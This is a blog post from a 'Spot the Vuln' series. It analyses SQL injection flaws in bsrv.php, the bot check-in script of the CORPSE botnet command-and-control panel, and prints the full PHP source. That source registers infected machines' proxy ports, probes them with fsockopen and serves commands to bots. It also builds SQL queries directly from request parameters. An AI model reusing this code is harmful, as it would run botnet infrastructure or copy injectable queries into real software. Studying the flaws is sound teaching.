---
layout: post
title: Feathers - SQLi
tags:
- Code Snippet
status: publish
type: post
published: true
meta:
  aktt_notify_twitter: 'yes'
  _aktt_hash_meta: ! '#secure #code #dev'
  _edit_last: '2'
  aktt_tweeted: '1'
---
## Details
__Affected Software:__ Corpse C&C

__Fixed in Version:__  Not Patched

__Issue Type:__ SQL Injection

Original Code: <a href="http://spotthevuln.com/2011/06/feathers/">Found Here</a>

## Description
This week's bugs are in the CORPSE C&C (in the bsrv.php file).  There are a couple of bugs here, most of them are very straight forward.   Funny stuff first... if $ver is blank, we will fail the "security check".  So, in order to reach any of these vulns, we have to provide an arbitrary value for $ver.  $ver is set from $_GET['ver'], so we have to provide a bsrv.php?ver=pwnd for each request in order to reach the vulnerable code.  It's rigorous security checks like this that make exploitation difficult.  
<br/>
$id and $param are validated through a manual process (code on line 27 - 36).  I don't know why the developer didn't take advantage of built-in escaping routines... but the validation provided here seem to defend against common vulns.  What's also puzzling, is why the other variables weren't validated/escaped.  Veteran Spot the Vuln readers have seen this pattern before (escape one variable, miss the next variable) in other software, but for some reason I still find it surprising every time I see it.  Now, let's get onto the actual bugs.  The most obvious are $uid and $httpport which are set directly from user controlled input ($_GET).  These two variables are then used to build a dynamic SQL statement.  This results in SQL injection.
<br/>
Additionally, $uptimem and $uptimeh are used to set $sql_uptime.  $sql_uptime is then used in a dynamic SQL statement resulting in yet another SQL injection.
$browser is taken from getenv("HTTP_USER_AGENT"), which is attacker controlled (the user agent header in the HTTP request).  Although $browser isn't used on this page, it's just asking for trouble :)
<br/>
Upon first glance, it seems like $real_ip and $socksport could be used to reach a SQL injection.  After some more investigation, it is likely that the fsockopen call would probably fail before $real_ip and $socksport could be passed to a dynamic SQL statement.  With that said, $real_ip and $socksport can be still be used to generate a fsockopen request to an arbitrary system (line 59). 
<br/>
## Developers Solution
<code lang="PHP" highlight="59,67,71,74,98,102,105">
<?php

// Gettin all information
$id = $_GET['id'];
$httpport = $_GET['httpport'];
$socksport = $_GET['socksport'];
$uptimem = $_GET['uptimem'];
$uptimeh = $_GET['uptimeh'];
$param = $_GET['param'];
$ver = $_GET['ver'];
$uid = $_GET['uid'];
$wm = $_GET['wm'];
$lang = $_GET['lang'];
//$ssip = $_GET['ssip'] ;
$ip = getenv("REMOTE_ADDR");
$real_ip = getenv("HTTP_X_FORWARDED_FOR");
$browser = getenv("HTTP_USER_AGENT");

//Security check
if($ver == ''){
	exit;
}

include_once('./mysqllog.php');

//Replace symbols
$id = ereg_replace("<","&#8249",$id);
$id = ereg_replace(">","&#8250",$id);
$id = ereg_replace("\"","&#8221",$id);
$id = ereg_replace(";","",$id);
$id = ereg_replace("%","",$id);
$param = ereg_replace("<","&#8249",$param);
$param = ereg_replace(">","&#8250",$param);
$param = ereg_replace("\"","&#8221",$param);
$param = ereg_replace(";","",$param);
$param = ereg_replace("%","",$param);

/*=========================
$flip = file("logs/cip.dat");
$size  = strlen($flip);
if ($size > 10) {
 	$arr = explode(":", $flip[0]);
 	$aport=311;
}

if($arr[1] == $uid || $arr[1] == "0") {
	$fp = fsockopen($arr[0],$aport, $errno, $errstr, 30); 
	fputs($fp,"IP:$ip PORT:$param $tim SOCKS:$socksport HTTP:$httpport Uptime:$uptimeh:$uptimem lang-$lang uid:$uid id:$id v:$ver\r\n");
	fclose($fp);
}
//=========================*/

$date = date("Y-m-d");
$time=date("H:i:s");
list($year, $month, $day) = explode('-', $date);
$sql_uptime = "$uptimeh:$uptimem";

if($real_ip != "") {
	$fp = fsockopen($real_ip,$socksport, $errno, $errstr, 30); 
	if(!$fp) {
		$okk = false;		
	} else {
		$okk = true;
		
		$link = mysql_connect($mysql_host, $mysql_login, $mysql_pass) or die("Could not connect: " . mysql_error());
		mysql_select_db($mysql_db, $link) or die("Could not select : " . mysql_error());
		$query = 'SELECT COUNT(*) FROM socks where uid = "'. $uid .'"';
		$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		$count = mysql_result($result, 0);
		if ($count == 0) {
			$query = 'INSERT INTO socks VALUES ("'.$uid.'", "'. $real_ip . '", "'. $httpport .'", "'. $socksport . '", "'. $sql_uptime .'", "'. mktime() .'", "0")';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		} else { 
			$query = 'UPDATE socks SET  `ip` = "'. $real_ip .'", `hport` = "'. $httpport .'", `sport` = "'. $socksport .'", `uptime` = "'. $sql_uptime .'", `update` = "'. mktime() .'" WHERE `uid` = "'.$uid.'"';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
			$query = 'COMMIT';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		}
		mysql_close($link);

		//$fh=fopen("logs/P.$day.$month.txt","a+");
		//ip:hport:sport:bport:uptime:uid
		//fputs($fh,"$real_ip@$httpport@$socksport@$param@$uptimeh:$uptimem@$uid\r\n");
		//fclose($fh);
		send_command();
		exit;
	}
}

if( ($ip != "") && ($ip != $real_ip) ) {
	$fp = fsockopen($ip,$socksport, $errno, $errstr, 30);
	if(!$fp) {
		send_command();
		exit;
	} else {
		$link = mysql_connect($mysql_host, $mysql_login, $mysql_pass) or die("Could not connect: " . mysql_error());
		mysql_select_db($mysql_db, $link) or die("Could not select : " . mysql_error());
		$query = 'SELECT COUNT(*) FROM socks where uid = "'. $uid .'"';
		$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		$count = mysql_result($result, 0);
		if ($count == 0) {
			$query = 'INSERT INTO socks VALUES ("'.$uid.'", "'. $ip . '", "'. $httpport .'", "'. $socksport . '", "'. $sql_uptime .'", "'. mktime() .'", "0")';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		} else { 
			$query = 'UPDATE socks SET  `ip` = "'. $ip .'", `hport` = "'. $httpport .'", `sport` = "'. $socksport .'", `uptime` = "'. $sql_uptime .'", `update` = "'. mktime() .'" WHERE `uid` = "'.$uid.'"';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
			$query = 'COMMIT';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		}
		mysql_close($link);

		//$fh=fopen("logs/P.$day.$month.txt","a+");
		//ip:hport:sport:bport:uptime:uid
		//fputs($fh,"$ip@$httpport@$socksport@$param@$uptimeh:$uptimem@$uid\r\n");
		//fclose($fh);
		send_command();
		exit;
	}
}

send_command();
exit;

function send_command() {
$cmdname="logs/cfg.dat";
$cmduid="logs/uid.ini";

if(filesize("$cmduid") == 0) {
	$fh=fopen($cmdname,"r");
	$cfgdata=fread($fh,filesize($cmdname));
	fclose($fh);
	echo "CMND$cfgdata";
	exit;
}

$array=file($cmduid);
$kolvo=count($array);
for($ei=0;$ei<$kolvo;$ei++) {
	$llen=strlen($array[$ei]);
	$llen=$llen-2;
	$array[$ei]=substr($array[$ei],0,$llen);
	if($array[$ei] == $uid) {
		$fh=fopen($cmdname,"r");
		$cfgdata=fread($fh,filesize($cmdname));
		fclose($fh);
		echo "CMND$cfgdata";
		exit;
	}
}
echo "CMND\r\n";
}

?>
</code>
